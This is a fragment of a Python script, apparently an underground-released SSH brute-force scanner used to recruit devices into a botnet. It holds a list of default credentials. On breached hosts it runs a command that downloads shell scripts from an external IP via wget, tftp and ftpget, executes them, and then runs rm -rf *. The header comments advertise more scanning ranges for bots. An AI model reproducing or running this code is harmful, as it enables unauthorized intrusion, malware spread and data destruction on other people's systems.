#!/usr/bin/env python
# Keep In Mind This Is Not My File Nor My Ranges
# If Youd Like More Ranges For More Bots, Message Me On Skype Via :mrevilaragon@outlook.com
# Once Again, Released By Jerry Underground 
# Please Comment What Next Tutorial You Would Want As I Do EveryThing in-Depth
...
if sys.argv[4] == '4':
     passwords = ["telnet:telnet","root:root","ubnt:ubnt"]
...
class sshscanner(threading.Thread):
    ...
    def run(self):
        while 1:
			...
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.57/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.57 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.57; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.57 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
